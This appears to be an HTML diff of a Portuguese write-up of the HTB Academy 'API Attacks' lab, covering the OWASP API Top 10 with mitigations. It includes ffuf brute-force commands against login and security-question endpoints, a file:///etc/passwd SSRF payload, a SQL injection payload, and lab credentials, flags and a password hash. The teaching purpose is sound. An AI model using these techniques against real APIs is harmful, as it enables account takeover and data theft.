@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>API Attacks — HTB Academy // 0x404</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --black:    #000408;
+      --panel:    #010d1a;
+      --cyan:     #00d4ff;
+      --cyan2:    #00aacc;
+      --cyan-dim: #004455;
+      --orange:   #ff6600;
+      --white:    #e0f7ff;
+      --muted:    #3a7a8a;
+      --green:    #44ff88;
+      --purple:   #cc88ff;
+      --red:      #ff4466;
+      --ff-title: 'Orbitron', monospace;
+      --ff-mono:  'Share Tech Mono', monospace;
+      --glow-sm:  0 0 8px #00d4ff88;
+      --glow-md:  0 0 16px #00d4ffaa, 0 0 32px #00d4ff44;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--black); color: var(--white); font-family: var(--ff-mono); font-size: 15px; line-height: 1.8; overflow-x: hidden; }
+    .grid-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; background-image: linear-gradient(var(--cyan-dim) 1px, transparent 1px), linear-gradient(90deg, var(--cyan-dim) 1px, transparent 1px); background-size: 48px 48px; opacity: 0.15; mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%); }
+    .scanlines { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px); }
+    .vignette { position: fixed; inset: 0; z-index: 2; pointer-events: none; background: radial-gradient(ellipse at center, transparent 50%, #000408bb 100%); }
+
+    nav { position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--cyan-dim); background: rgba(0,4,8,0.94); backdrop-filter: blur(12px); }
+    .nav-inner { max-width: 900px; margin: 0 auto; padding: 0 32px; display: flex; align-items: stretch; justify-content: space-between; height: 52px; }
+    .nav-logo { font-family: var(--ff-title); font-size: 14px; font-weight: 700; color: var(--cyan); text-decoration: none; letter-spacing: 0.15em; text-shadow: var(--glow-sm); display: flex; align-items: center; border-right: 1px solid var(--cyan-dim); padding-right: 24px; }
+    .nav-logo .slash { color: var(--orange); }
+    .nav-back { display: flex; align-items: center; gap: 8px; color: var(--muted); text-decoration: none; font-size: 11px; letter-spacing: 0.14em; text-transform: uppercase; transition: color .2s; }
+    .nav-back:hover { color: var(--cyan); }
+    .nav-back::before { content: '←'; font-size: 14px; }
+
+    /* TOC STICKY */
+    .toc-wrap { position: sticky; top: 52px; z-index: 90; background: rgba(0,4,8,0.97); backdrop-filter: blur(12px); border-bottom: 1px solid var(--cyan-dim); border-top: 1px solid var(--cyan-dim); }
+    .toc { max-width: 900px; margin: 0 auto; padding: 10px 32px; display: flex; align-items: center; gap: 20px; }
+    .toc-title { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; color: var(--orange); white-space: nowrap; }
+    .toc ol { list-style: none; counter-reset: toc; display: flex; flex-wrap: wrap; }
+    .toc li { counter-increment: toc; }
+    .toc a { color: var(--muted); text-decoration: none; font-size: 11px; display: flex; align-items: center; gap: 5px; padding: 4px 14px 4px 0; transition: color .2s; white-space: nowrap; }
+    .toc a::before { content: counter(toc, decimal-leading-zero) '.'; font-family: var(--ff-title); font-size: 9px; color: var(--cyan-dim); transition: color .2s; }
+    .toc a:hover { color: var(--cyan2); }
+    .toc a.active { color: var(--cyan); }
+    .toc a.active::before { color: var(--cyan); }
+
+    .page { position: relative; z-index: 10; max-width: 900px; margin: 0 auto; padding: 0 32px; }
+
+    /* HEADER */
+    .wu-header { padding: 64px 0 48px; border-bottom: 1px solid var(--cyan-dim); margin-bottom: 48px; }
+    .wu-meta { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 20px; }
+    .wu-cat { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; padding: 4px 12px; border: 1px solid; }
+    .cat-module { border-color: #cc88ff55; color: var(--purple); }
+    .cat-academy { border-color: #00d4ff55; color: var(--cyan2); }
+    .wu-date { font-size: 12px; color: var(--muted); letter-spacing: 0.08em; }
+    .wu-title { font-family: var(--ff-title); font-size: clamp(24px, 4vw, 40px); font-weight: 900; letter-spacing: 0.04em; line-height: 1.2; color: var(--cyan); text-shadow: var(--glow-md); margin-bottom: 16px; }
+    .wu-desc { font-size: 14px; color: var(--muted); max-width: 640px; line-height: 1.8; margin-bottom: 24px; }
+    .wu-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 28px; }
+    .tag { font-size: 11px; color: var(--muted); padding: 3px 10px; border: 1px solid #ffffff0f; background: rgba(255,255,255,0.02); }
+    .wu-infobar { display: flex; flex-wrap: wrap; gap: 2px; border: 1px solid var(--cyan-dim); }
+    .wu-infobar-item { padding: 10px 20px; background: var(--panel); display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 120px; }
+    .wi-label { font-size: 10px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; }
+    .wi-value { font-family: var(--ff-title); font-size: 12px; font-weight: 700; color: var(--cyan); letter-spacing: 0.04em; }
+
+    /* OWASP TABLE */
+    .owasp-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 13px; }
+    .owasp-table th { background: var(--panel); border: 1px solid var(--cyan-dim); padding: 10px 16px; text-align: left; font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.12em; color: var(--cyan); text-transform: uppercase; }
+    .owasp-table td { border: 1px solid #ffffff08; padding: 10px 16px; color: #8ab4be; vertical-align: top; }
+    .owasp-table tr:hover td { background: rgba(0,212,255,0.03); }
+    .owasp-id { font-family: var(--ff-title); font-size: 10px; font-weight: 700; color: var(--orange); white-space: nowrap; }
+
+    /* CONTENT */
+    .wu-content { max-width: 760px; }
+    .wu-content h2 { font-family: var(--ff-title); font-weight: 700; font-size: 17px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--cyan); text-shadow: var(--glow-sm); margin: 56px 0 20px; padding-bottom: 10px; border-bottom: 1px solid var(--cyan-dim); display: flex; align-items: center; gap: 12px; }
+    .wu-content h2::before { content: '//'; color: var(--orange); font-size: 14px; }
+    .wu-content h3 { font-family: var(--ff-title); font-size: 13px; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan2); margin: 32px 0 14px; }
+    .wu-content h3::before { content: '> '; color: var(--muted); }
+    .wu-content p { color: #8ab4be; margin-bottom: 14px; line-height: 1.85; }
+    .wu-content strong { color: var(--white); font-weight: 700; }
+    .wu-content em { color: #aaccdd; font-style: italic; }
+    .wu-content a { color: var(--cyan2); text-decoration: none; }
+    .wu-content a:hover { color: var(--cyan); text-shadow: var(--glow-sm); }
+    .wu-content code { font-family: var(--ff-mono); font-size: 13px; color: var(--orange); background: rgba(255,102,0,0.08); padding: 2px 7px; border: 1px solid rgba(255,102,0,0.2); }
+    .wu-content pre { background: #000d16; border: 1px solid var(--cyan-dim); border-left: 3px solid var(--cyan); margin: 20px 0; overflow-x: auto; }
+    .wu-content pre .lang-label { display: block; padding: 6px 16px; background: var(--panel); border-bottom: 1px solid var(--cyan-dim); font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan2); text-transform: uppercase; }
+    .wu-content pre code { display: block; padding: 18px 20px; background: transparent; border: none; color: #7ecfbf; font-size: 13px; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
+    .wu-content ul { padding-left: 0; margin-bottom: 14px; list-style: none; }
+    .wu-content ul li { color: #8ab4be; padding: 3px 0 3px 22px; position: relative; }
+    .wu-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--cyan); font-size: 10px; top: 6px; }
+    .wu-content figure { margin: 28px 0; }
+    .wu-content figure img { max-width: 100%; display: block; border: 1px solid var(--cyan-dim); transition: border-color .2s; }
+    .wu-content figure img:hover { border-color: var(--cyan2); }
+
+    .callout-flag { background: rgba(255,68,102,0.06); border: 1px solid rgba(255,68,102,0.3); border-left: 3px solid var(--red); padding: 16px 20px; margin: 20px 0; }
+    .callout-flag .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--red); margin-bottom: 8px; }
+    .callout-flag p { color: #cc6688; margin: 0; }
+    .callout-flag code { color: var(--red); background: rgba(255,68,102,0.1); border-color: rgba(255,68,102,0.3); }
+    .callout-tip { background: rgba(68,255,136,0.04); border: 1px solid rgba(68,255,136,0.2); border-left: 3px solid var(--green); padding: 16px 20px; margin: 20px 0; }
+    .callout-tip .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--green); margin-bottom: 8px; }
+    .callout-tip p { color: #44aa66; margin: 0; }
+    .callout-info { background: rgba(0,212,255,0.04); border: 1px solid rgba(0,212,255,0.2); border-left: 3px solid var(--cyan); padding: 16px 20px; margin: 20px 0; }
+    .callout-info .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan); margin-bottom: 8px; }
+    .callout-info p { color: #3a7a8a; margin: 0; }
+    .callout-info code { color: var(--cyan2); }
+    .callout-warn { background: rgba(255,102,0,0.05); border: 1px solid rgba(255,102,0,0.25); border-left: 3px solid var(--orange); padding: 16px 20px; margin: 20px 0; }
+    .callout-warn .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--orange); margin-bottom: 8px; }
+    .callout-warn p { color: #aa6633; margin: 0; }
+
+    /* API BADGE */
+    .api-badge { display: inline-block; font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.1em; padding: 3px 10px; border: 1px solid var(--orange); color: var(--orange); margin-bottom: 12px; }
+
+    footer { border-top: 1px solid var(--cyan-dim); padding: 32px 0; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--muted); letter-spacing: 0.08em; }
+    .status-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); display: inline-block; margin-right: 8px; animation: pulse 2s ease-in-out infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  </style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+
+<nav>
+  <div class="nav-inner">
+    <a href="../../index.html" class="nav-logo">0x404</a>
+    <a href="../web-app.html" class="nav-back">Web App Security</a>
+  </div>
+</nav>
+
+<div class="toc-wrap">
+  <nav class="toc">
+    <div class="toc-title">// Índice</div>
+    <ol>
+      <li><a href="#intro">Introdução</a></li>
+      <li><a href="#api1">API1 — BOLA</a></li>
+      <li><a href="#api2">API2 — Broken Auth</a></li>
+      <li><a href="#api3">API3 — Mass Assignment</a></li>
+      <li><a href="#api4">API4 — Rate Limiting</a></li>
+      <li><a href="#api5">API5 — BFLA</a></li>
+      <li><a href="#api6">API6 — Business Flows</a></li>
+      <li><a href="#api7">API7 — SSRF</a></li>
+      <li><a href="#api8">API8 — SQLi</a></li>
+      <li><a href="#api9">API9 — Versioning</a></li>
+      <li><a href="#api10">API10 — Unsafe Consumption</a></li>
+      <li><a href="#skills">Skills Assessment</a></li>
+    </ol>
+  </nav>
+</div>
+
+<div class="page">
+
+  <header class="wu-header">
+    <div class="wu-meta">
+      <span class="wu-cat cat-module">Módulo</span>
+      <span class="wu-cat cat-academy">HTB Academy</span>
+      <span class="wu-date">MAR 2026</span>
+    </div>
+    <h1 class="wu-title">API Attacks</h1>
+    <p class="wu-desc">
+      Exploração completa do OWASP API Security Top 10 em uma API RESTful multilocatário com RBAC.
+      Cada seção cobre um risco diferente, com cenário prático, técnica de exploração e mitigação.
+    </p>
+    <div class="wu-tags">
+      <span class="tag">OWASP API Top 10</span>
+      <span class="tag">BOLA/IDOR</span>
+      <span class="tag">Broken Auth</span>
+      <span class="tag">Mass Assignment</span>
+      <span class="tag">SSRF</span>
+      <span class="tag">BFLA</span>
+      <span class="tag">SQLi</span>
+      <span class="tag">JWT</span>
+      <span class="tag">RESTful API</span>
+    </div>
+    <div class="wu-infobar">
+      <div class="wu-infobar-item">
+        <span class="wi-label">Plataforma</span>
+        <span class="wi-value">HTB Academy</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Tipo</span>
+        <span class="wi-value">Módulo</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Foco</span>
+        <span class="wi-value">Web / API</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Seções</span>
+        <span class="wi-value">12</span>
+      </div>
+    </div>
+  </header>
+
+  <div class="wu-content">
+
+    <h2 id="intro">Introdução & Lab</h2>
+
+    <p>As APIs são fundamentais para o desenvolvimento de software moderno, servindo como pontes de comunicação entre sistemas. Neste módulo, exploramos uma <strong>API RESTful multilocatário</strong> com RBAC — o <em>Inlanefreight E-Commerce Marketplace</em> — identificando e explorando cada um dos 10 principais riscos do OWASP API Security Top 10.</p>
+
+    <h3>Estilos Arquitetônicos de API</h3>
+    <ul>
+      <li><strong>REST</strong> — Client-server, stateless, métodos HTTP (GET, POST, PUT, DELETE). Respostas em JSON/XML.</li>
+      <li><strong>SOAP</strong> — XML para troca de mensagens. Altamente padronizado, mais complexo.</li>
+      <li><strong>GraphQL</strong> — Endpoint único, cliente especifica exatamente quais dados precisa.</li>
+      <li><strong>gRPC</strong> — Protocol Buffers, alta performance, ideal para microsserviços.</li>
+    </ul>
+
+    <h3>Contexto do Lab</h3>
+    <p>O marketplace utiliza <strong>Role-Based Access Control (RBAC)</strong> — as roles compartilham o mesmo nome dos endpoints que autorizam. Contas <code>@pentestercompany.com</code> são fornecedores; contas <code>@hackthebox.com</code> são clientes. A API é acessível via interface Swagger em <code>/swagger</code>.</p>
+
+    <figure><img src="api-attack-imgs/intro-lab.png" alt="Interface Swagger do Inlanefreight E-Commerce Marketplace" /></figure>
+
+    <h3>OWASP API Security Top 10 — 2023</h3>
+    <table class="owasp-table">
+      <thead><tr><th>ID</th><th>Risco</th></tr></thead>
+      <tbody>
+        <tr><td><span class="owasp-id">API1:2023</span></td><td>Broken Object Level Authorization — acesso a objetos não autorizados</td></tr>
+        <tr><td><span class="owasp-id">API2:2023</span></td><td>Broken Authentication — mecanismos contornáveis</td></tr>
+        <tr><td><span class="owasp-id">API3:2023</span></td><td>Broken Object Property Level Authorization — exposição/manipulação indevida de propriedades</td></tr>
+        <tr><td><span class="owasp-id">API4:2023</span></td><td>Unrestricted Resource Consumption — sem limitação de recursos</td></tr>
+        <tr><td><span class="owasp-id">API5:2023</span></td><td>Broken Function Level Authorization — funções acessíveis por não-autorizados</td></tr>
+        <tr><td><span class="owasp-id">API6:2023</span></td><td>Unrestricted Access to Sensitive Business Flows — fluxos críticos expostos</td></tr>
+        <tr><td><span class="owasp-id">API7:2023</span></td><td>Server Side Request Forgery — requisições maliciosas a recursos internos</td></tr>
+        <tr><td><span class="owasp-id">API8:2023</span></td><td>Security Misconfiguration — SQLi, CORS, headers inseguros</td></tr>
+        <tr><td><span class="owasp-id">API9:2023</span></td><td>Improper Inventory Management — versões antigas acessíveis</td></tr>
+        <tr><td><span class="owasp-id">API10:2023</span></td><td>Unsafe Consumption of APIs — confiança cega em APIs de terceiros</td></tr>
+      </tbody>
+    </table>
+
+    <!-- API1 -->
+    <h2 id="api1">API1:2023 — Broken Object Level Authorization</h2>
+    <div class="api-badge">CWE-639 · Authorization Bypass Through User-Controlled Key</div>
+
+    <p>Um endpoint é vulnerável a <strong>BOLA (Broken Object Level Authorization)</strong>, também conhecido como <strong>IDOR</strong>, quando não verifica corretamente se o usuário autenticado tem permissão para acessar o objeto específico solicitado.</p>
+
+    <h3>Cenário</h3>
+    <p>Credenciais: <code>htbpentester1@pentestercompany.com:HTBPentester1</code>. Após autenticar e obter o JWT, inspecionamos nossas roles via <code>/api/v1/roles/current-user</code> — obtemos a role <code>SupplierCompanies_GetYearlyReportByID</code>.</p>
+
+    <figure><img src="api-attack-imgs/api1-img1.png" alt="Role SupplierCompanies_GetYearlyReportByID identificada" /></figure>
+
+    <p>O endpoint <code>/api/v1/supplier-companies/yearly-reports/{ID}</code> aceita um inteiro como ID. Ao usar <code>ID=1</code>, recebemos o relatório anual de uma empresa diferente da nossa — confirmando o BOLA.</p>
+
+    <figure><img src="api-attack-imgs/api1-img2.png" alt="BOLA confirmado — relatório de outra empresa acessado" /></figure>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ Mitigação</div>
+      <p>Implementar verificação de autorização no nível do objeto — garantir que o usuário autenticado seja dono ou tenha permissão explícita para o recurso solicitado antes de retornar dados.</p>
+    </div>
+
+    <!-- API2 -->
+    <h2 id="api2">API2:2023 — Broken Authentication</h2>
+    <div class="api-badge">CWE-307 · Improper Restriction of Excessive Authentication Attempts</div>
+
+    <p>A API sofre de <strong>Broken Authentication</strong> quando seus mecanismos de autenticação podem ser contornados ou quando não implementa rate-limiting nas tentativas de login.</p>
+
+    <h3>Cenário — Força Bruta de Senha Fraca</h3>
+    <p>Credenciais: <code>htbpentester3@hackthebox.com:HTBPentester3</code>. Ao atualizar a senha via <code>PATCH /api/v1/customers/current-user</code>, descobrimos que a API aceita senhas de apenas 6 caracteres. Essa política fraca sugere que outros usuários podem ter senhas simples.</p>
+
+    <figure><img src="api-attack-imgs/api2-img1.png" alt="Política de senha fraca — mínimo 6 caracteres aceito" /></figure>
+
+    <p>Usando <code>ffuf</code> com duas wordlists (emails e senhas) contra <code>/api/v1/authentication/customers/sign-in</code>:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ ffuf -w emails.txt:EMAIL -w xato-net-10-million-passwords-10000.txt:PASS \
+  -u http://TARGET/api/v1/authentication/customers/sign-in \
+  -X POST -H 'Content-Type: application/json' \
+  -d '{"email":"EMAIL","password":"PASS"}' \
+  -fr "Invalid Credentials"</code></pre>
+
+    <figure><img src="api-attack-imgs/api2-img2.png" alt="Força bruta encontrando senha de IsabellaRichardson" /></figure>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ Mitigação</div>
+      <p>Implementar rate-limiting nas tentativas de autenticação, exigir senhas criptograficamente seguras (mínimo 12 caracteres com complexidade) e considerar bloqueio temporário após N tentativas falhas.</p>
+    </div>
+
+    <!-- API3 -->
+    <h2 id="api3">API3:2023 — Broken Object Property Level Authorization</h2>
+    <div class="api-badge">CWE-213 · Excessive Data Exposure &amp; CWE-915 · Mass Assignment</div>
+
+    <p>Esta categoria cobre duas subclasses: <strong>Excessive Data Exposure</strong> (API retorna campos sensíveis que não deveria) e <strong>Mass Assignment</strong> (usuário manipula propriedades que não deveria).</p>
+
+    <h3>Excessive Data Exposure</h3>
+    <p>Credenciais: <code>htbpentester4@hackthebox.com:HTBPentester4</code>. O endpoint <code>GET /api/v1/suppliers</code> retorna <code>email</code> e <code>phoneNumber</code> dos fornecedores para clientes — dados que permitem contato direto, bypassando o marketplace e causando perda de receita.</p>
+
+    <figure><img src="api-attack-imgs/api3-img1.png" alt="Endpoint retornando email e phoneNumber dos fornecedores" /></figure>
+
+    <h3>Mass Assignment</h3>
+    <p>Credenciais: <code>htbpentester6@pentestercompany.com:HTBPentester6</code>. O endpoint de atualização aceita campos que não deveriam ser modificáveis pelo usuário — permitindo alteração de propriedades privilegiadas como roles ou IDs de empresa.</p>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ Mitigação</div>
+      <p>Usar DTOs (Data Transfer Objects) específicos para cada operação, retornando apenas os campos necessários. Nunca expor o modelo de domínio diretamente. Usar allowlists de campos aceitos nas requisições.</p>
+    </div>
+
+    <!-- API4 -->
+    <h2 id="api4">API4:2023 — Unrestricted Resource Consumption</h2>
+    <div class="api-badge">CWE-400 · Uncontrolled Resource Consumption</div>
+
+    <p>A API é vulnerável quando não limita o consumo de recursos como bandwidth, CPU, memória ou armazenamento.</p>
+
+    <h3>Cenário — Upload sem Limites</h3>
+    <p>Credenciais: <code>htbpentester8@pentestercompany.com:HTBPentester8</code>. O endpoint <code>POST /api/v1/supplier-companies/certificates-of-incorporation</code> aceita PDFs sem validar tamanho ou tipo de arquivo.</p>
+
+    <pre><span class="lang-label">bash</span><code># Criando arquivo de 30MB com bytes aleatórios
+$ dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
+30+0 records out | 31457280 bytes (30 MiB) copied
+
+# Upload de executável malicioso
+$ dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10
+10+0 records out | 10485760 bytes (10 MiB) copied</code></pre>
+
+    <p>Ambos os uploads foram aceitos — sem validação de tamanho ou extensão. Arquivos ficam armazenados em <code>wwwroot/SupplierCompaniesCertificatesOfIncorporations</code>, podendo ser executados via engenharia social.</p>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ Mitigação</div>
+      <p>Validar tamanho máximo de upload, extensões permitidas (allowlist), tipo MIME real do arquivo, e implementar rate-limiting por usuário. Nunca armazenar arquivos em diretórios web-acessíveis sem sanitização.</p>
+    </div>
+
+    <!-- API5 -->
+    <h2 id="api5">API5:2023 — Broken Function Level Authorization</h2>
+    <div class="api-badge">CWE-200 · Exposure of Sensitive Information to an Unauthorized Actor</div>
+
+    <p>Diferente do BOLA, no <strong>BFLA</strong> o usuário não deveria ter acesso ao endpoint — mas a verificação de autorização não foi implementada no código.</p>
+
+    <h3>Cenário</h3>
+    <p>Credenciais: <code>htbpentester9@hackthebox.com:HTBPentester9</code>. O endpoint <code>GET /api/v1/products/discounts</code> requer a role <code>ProductDiscounts_GetAll</code>. Nosso usuário não possui nenhuma role atribuída — mas ao invocar o endpoint, recebemos todos os dados de desconto de produtos.</p>
+
+    <div class="callout-warn">
+      <div class="cf-title">⚠ Diferença BOLA vs BFLA</div>
+      <p>No <strong>BOLA</strong>, o usuário está autorizado a usar o endpoint mas acessa objetos de outros. No <strong>BFLA</strong>, o usuário não deveria ter acesso ao endpoint em nenhuma circunstância.</p>
+    </div>
+
+    <h3>Lab Prático</h3>
+    <pre><span class="lang-label">bash</span><code>$ curl -X 'GET' 'http://TARGET/api/v1/customers/billing-addresses' \
+  -H 'Authorization: Bearer JWT_TOKEN' | jq | grep HTB
+
+"street": "HTB{1e2095c564baf0d2d316080217040dae}"</code></pre>
+
+    <!-- API6 -->
+    <h2 id="api6">API6:2023 — Unrestricted Access to Sensitive Business Flows</h2>
+
+    <p>A exposição de dados de desconto (via BFLA) também leva a <strong>Unrestricted Access to Sensitive Business Flows</strong> — conhecendo datas e percentuais de desconto, é possível comprar todo o estoque no início do período e revender após o término.</p>
+
+    <h3>Lab Prático</h3>
+    <pre><span class="lang-label">bash</span><code># Identificando endereço de usuário específico via BFLA
+$ curl 'http://TARGET/api/v1/customers/billing-addresses' \
+  -H 'Authorization: Bearer JWT' | grep 'daa8c984'
+
+{"customerID":"daa8c984...","city":"Glasgow","country":"UK",
+ "street":"788 Sauchiehall St.","postalCode":63103}</code></pre>
+
+    <!-- API7 -->
+    <h2 id="api7">API7:2023 — Server Side Request Forgery</h2>
+    <div class="api-badge">CWE-918 · Server-Side Request Forgery (SSRF)</div>
+
+    <p>A API é vulnerável a <strong>SSRF</strong> quando utiliza entrada controlada pelo usuário para buscar recursos sem validação — permitindo acesso a recursos internos ou arquivos locais do servidor.</p>
+
+    <h3>Cenário</h3>
+    <p>Credenciais: <code>htbpentester10@pentestercompany.com:HTBPentester10</code>. Após fazer upload de um PDF via <code>POST /api/v1/supplier-companies/certificates-of-incorporation</code>, a resposta retorna o campo <code>fileURI</code> com o esquema <code>file://</code>.</p>
+
+    <figure><img src="api-attack-imgs/api7-img1.png" alt="Campo fileURI usando esquema file://" /></figure>
+
+    <p>O endpoint <code>PATCH /api/v1/supplier-companies</code> permite modificar o campo <code>CertificateOfIncorporationPDFFileURI</code>. Apontamos para <code>/etc/passwd</code>:</p>
+
+    <pre><span class="lang-label">bash</span><code># Atualiza o URI para apontar para arquivo interno
+PATCH /api/v1/supplier-companies
+{"CertificateOfIncorporationPDFFileURI": "file:///etc/passwd"}
+
+# Leitura do arquivo via endpoint de certificado
+GET /api/v1/supplier-companies/{ID}/certificates-of-incorporation
+# → retorna conteúdo do /etc/passwd</code></pre>
+
+    <!-- API8 -->
+    <h2 id="api8">API8:2023 — Security Misconfiguration</h2>
+    <div class="api-badge">CWE-89 · SQL Injection</div>
+
+    <p>APIs sofrem de <strong>Security Misconfiguration</strong> quando aceitam entrada do usuário sem sanitização em comandos SQL, ou quando não configuram adequadamente headers de segurança HTTP.</p>
+
+    <h3>Cenário — SQL Injection</h3>
+    <p>Credenciais: <code>htbpentester12@pentestercompany.com:HTBPentester12</code>. O endpoint <code>GET /api/v1/products/{Name}/count</code> é vulnerável quando o parâmetro contém um apóstrofo:</p>
+
+    <pre><span class="lang-label">bash</span><code># Teste básico — retorna erro com apóstrofo
+GET /api/v1/products/laptop'/count
+
+# Payload de SQLi — retorna total de 720 produtos
+GET /api/v1/products/laptop' OR 1=1 --/count</code></pre>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ Mitigação</div>
+      <p>Usar consultas parametrizadas ou ORMs. Validar e sanitizar toda entrada do usuário. Implementar headers de segurança HTTP (CORS restritivo, CSP, etc.) conforme o <a href="https://owasp.org/www-project-secure-headers/" target="_blank">OWASP Secure Headers Project</a>.</p>
+    </div>
+
+    <!-- API9 -->
+    <h2 id="api9">API9:2023 — Improper Inventory Management</h2>
+
+    <p>Versões antigas de API sem manutenção representam vetores de ataque quando permanecem acessíveis em produção.</p>
+
+    <h3>Cenário — API v0 sem Autenticação</h3>
+    <p>Na interface Swagger, identificamos a existência de uma versão <code>v0</code> descrita como "dados legados que deveriam ser removidos". Nenhum endpoint da <code>v0</code> exige autenticação:</p>
+
+    <pre><span class="lang-label">bash</span><code># Dados de clientes deletados — incluindo hashes de senha!
+GET /api/v0/customers/deleted
+# → retorna registros com passwordHash expostos
+
+# Lab prático — empresa deletada por ID
+$ curl 'http://TARGET/api/v0/supplier-companies/deleted' | \
+  jq '.[] | select(.ID == "c250cb38-...")'
+
+{
+  "ID": "c250cb38-96e3-4ccf-9df2-0a03146a2d0b",
+  "Name": "Hack The Box",
+  "Email": "HTB{43c2754afea99eba70fb2c8dc443c660}"
+}</code></pre>
+
+    <figure><img src="api-attack-imgs/api9-img4.png" alt="Endpoint v0 expondo dados sem autenticação" /></figure>
+
+    <!-- API10 -->
+    <h2 id="api10">API10:2023 — Unsafe Consumption of APIs</h2>
+    <div class="api-badge">CWE-1357 · Reliance on Insufficiently Trustworthy Component</div>
+
+    <p>APIs que consomem outras APIs sem validação adequada podem ser comprometidas por dados maliciosos propagados através da cadeia de serviços.</p>
+
+    <h3>Vetores Principais</h3>
+    <ul>
+      <li><strong>Insecure Data Transmission</strong> — comunicação por canais não criptografados</li>
+      <li><strong>Inadequate Data Validation</strong> — não sanitizar dados recebidos de APIs externas</li>
+      <li><strong>Weak Authentication</strong> — autenticação fraca na comunicação API-API</li>
+      <li><strong>Insufficient Rate-Limiting</strong> — uma API sobrecarregando outra (DoS)</li>
+    </ul>
+
+    <pre><span class="lang-label">bash</span><code># Lab — fornecedor deletado com dados expostos
+$ curl 'http://TARGET/api/v0/suppliers/deleted' | \
+  jq '.[] | select(.Name == "Yara MacDonald")'
+
+{
+  "Name": "Yara MacDonald",
+  "Email": "Y.MacDonald1406@cyberneticsolutions.com",
+  "PasswordHash": "006006C3167E90A7575A12E474218D86"
+}</code></pre>
+
+    <!-- SKILLS ASSESSMENT -->
+    <h2 id="skills">Skills Assessment</h2>
+
+    <p>O administrador tentou corrigir todas as vulnerabilidades na <strong>v2</strong>, mas novos desenvolvedores introduziram novas falhas. O objetivo é comprometer a v2 aplicando tudo que foi aprendido.</p>
+
+    <h3>Reconnaissance — Excessive Data Exposure</h3>
+    <p>Credenciais iniciais: <code>htbpentester@hackthebox.com:HTBPentester</code>. Roles: <code>Suppliers_Get</code> e <code>Suppliers_GetAll</code>.</p>
+
+    <p>O endpoint <code>GET /api/v2/suppliers/</code> retorna campos sensíveis além do necessário — incluindo <code>securityQuestion</code> de cada fornecedor. Identificamos que várias contas usam a mesma pergunta: <em>"What is your favorite color?"</em></p>
+
+    <figure><img src="api-attack-imgs/skills-img1.png" alt="Excessive Data Exposure revelando pergunta de segurança" /></figure>
+
+    <h3>Força Bruta — Security Question</h3>
+    <p>Identificamos um endpoint de reset de senha via resposta de segurança: <code>POST /api/v2/authentication/suppliers/passwords/resets/security-question-answers</code>.</p>
+
+    <pre><span class="lang-label">bash</span><code># Força bruta com emails e lista de cores
+$ ffuf -w emails.txt:EMAIL -w colors.txt:COLOR \
+  -u http://TARGET/api/v2/authentication/suppliers/passwords/resets/security-question-answers \
+  -X POST -H 'Content-Type: application/json' \
+  -d '{"SupplierEmail":"EMAIL","SecurityQuestionAnswer":"COLOR","NewPassword":"123456"}' \
+  -fr "false"
+
+[Status: 200]
+  * EMAIL: B.Rogers1535@globalsolutions.com
+  * COLOR: rust</code></pre>
+
+    <figure><img src="api-attack-imgs/skills-img2.png" alt="ffuf encontrando a cor correta" /></figure>
+
+    <h3>SSRF — Leitura de Arquivo Interno</h3>
+    <p>Com acesso como <code>B.Rogers1535</code>, analisamos os endpoints disponíveis e identificamos o campo <code>professionalCVPDFFileURI</code> — padrão SSRF similar ao API7.</p>
+
+    <figure><img src="api-attack-imgs/skills-img3.png" alt="Campo professionalCVPDFFileURI identificado" /></figure>
+
